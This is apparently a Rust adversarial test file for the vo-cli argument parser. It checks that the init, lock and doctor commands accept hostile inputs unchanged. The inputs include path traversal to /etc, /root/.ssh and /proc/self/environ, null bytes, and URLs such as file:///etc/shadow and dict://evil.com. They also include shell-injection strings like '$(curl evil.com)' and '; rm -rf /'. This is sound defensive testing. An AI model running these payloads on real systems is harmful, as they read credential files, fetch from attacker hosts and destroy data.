//! BLACK-HAT hardline adversarial tests for vo-cli.
//! Attack surface: init, lock, doctor commands and escape hatches.

use std::ffi::OsString;
use vo_cli::cli::{interpret_cli_from, Command};

#[test]
fn init_accepts_absolute_path_traversal() {
    let args = vec![
        OsString::from("vo"),
        OsString::from("init"),
        OsString::from("--project-dir"),
        OsString::from("/etc/veloxide"),
        OsString::from("--storage-path"),
        OsString::from("../../../root/.ssh"),
    ];
    let cli = interpret_cli_from(args).unwrap();
    if let Command::Init {
        project_dir,
        storage_path,
        ..
    } = &cli.command
    {
        assert!(project_dir.to_string_lossy().contains("etc"));
        assert!(storage_path.to_string_lossy().contains(".ssh"));
    }
}

#[test]
fn init_accepts_null_bytes_in_paths() {
    let args = vec![
        OsString::from("vo"),
        OsString::from("init"),
        OsString::from("--project-dir"),
        OsString::from("/tmp/vo\x00/etc"),
        OsString::from("--storage-path"),
        OsString::from(".vo/storage\x00"),
    ];
    let cli = interpret_cli_from(args).unwrap();
    if let Command::Init {
        project_dir,
        storage_path,
        ..
    } = &cli.command
    {
        let pd = project_dir.to_string_lossy();
        let sp = storage_path.to_string_lossy();
        assert!(pd.contains('\0') || sp.contains('\0'));
    }
}

#[test]
fn init_engine_url_scheme_injection() {
    let evil_urls = [
        "http://localhost:3000/..%2f..%2f..%2fetc/passwd",
        "http://localhost:3000/../../../etc/shadow",
        "file:///etc/shadow",
        "dict://evil.com:9999",
    ];
    for url in evil_urls {
        let args = vec![
            OsString::from("vo"),
            OsString::from("init"),
            OsString::from("--engine-url"),
            OsString::from(url),
        ];
        let cli = interpret_cli_from(args).unwrap();
        if let Command::Init { engine_url, .. } = &cli.command {
            assert_eq!(engine_url, url);
        }
    }
}

#[test]
fn lock_accepts_any_project_dir() {
    let traversal_paths = [
        "/tmp/../../../etc",
        "../../../root/.ssh",
        "/proc/self/environ",
    ];
    for path in traversal_paths {
        let args = vec![
            OsString::from("vo"),
            OsString::from("lock"),
            OsString::from("--project-dir"),
            OsString::from(path),
        ];
        let cli = interpret_cli_from(args).unwrap();
        if let Command::Lock { project_dir } = &cli.command {
            assert!(!project_dir.to_string_lossy().is_empty());
        }
    }
}

#[test]
fn lock_path_with_shell_metacharacters() {
    let payloads = [
        "$(curl evil.com)",
        "; rm -rf /",
        "`id`",
        "vo\"; drop table;",
    ];
    for payload in payloads {
        let args = vec![
            OsString::from("vo"),
            OsString::from("lock"),
            OsString::from("--project-dir"),
            OsString::from(payload),
        ];
        let cli = interpret_cli_from(args).unwrap();
        if let Command::Lock { project_dir } = &cli.command {
            assert_eq!(project_dir.to_string_lossy(), payload);
        }
    }
}

#[test]
fn doctor_accepts_path_traversal() {
    let args = vec![
        OsString::from("vo"),
        OsString::from("doctor"),
        OsString::from("--project-dir"),
        OsString::from("../../../../etc"),
    ];
    let cli = interpret_cli_from(args).unwrap();
    if let Command::Doctor { project_dir } = &cli.command {
        assert!(project_dir.to_string_lossy().contains(".."));
    }
}

#[test]
fn doctor_accepts_null_bytes_and_unicode() {
    let malicious = "/tmp/vo\x00/../../etc/\u{202E}uwu";
    let args = vec![
        OsString::from("vo"),
        OsString::from("doctor"),
        OsString::from("--project-dir"),
        OsString::from(malicious),
    ];
    let cli = interpret_cli_from(args).unwrap();
    if let Command::Doctor { project_dir } = &cli.command {
        assert!(!project_dir.as_os_str().is_empty());
    }
}

#[test]
fn init_default_storage_path_is_relative() {
    let args = vec![OsString::from("vo"), OsString::from("init")];
    let cli = interpret_cli_from(args).unwrap();
    if let Command::Init { storage_path, .. } = &cli.command {
        assert_eq!(storage_path.to_string_lossy(), ".vo/storage");
    }
}

#[test]
fn init_accepts_empty_engine_url() {
    let args = vec![
        OsString::from("vo"),
        OsString::from("init"),
        OsString::from("--engine-url"),
        OsString::from(""),
    ];
    let cli = interpret_cli_from(args).unwrap();
    if let Command::Init { engine_url, .. } = &cli.command {
        assert_eq!(engine_url, "");
    }
}

#[test]
fn lock_accepts_empty_project_dir() {
    let args = vec![
        OsString::from("vo"),
        OsString::from("lock"),
        OsString::from("--project-dir"),
        OsString::from(""),
    ];
    let cli = interpret_cli_from(args).unwrap();
    if let Command::Lock { project_dir } = &cli.command {
        assert_eq!(project_dir.to_string_lossy(), "");
    }
}
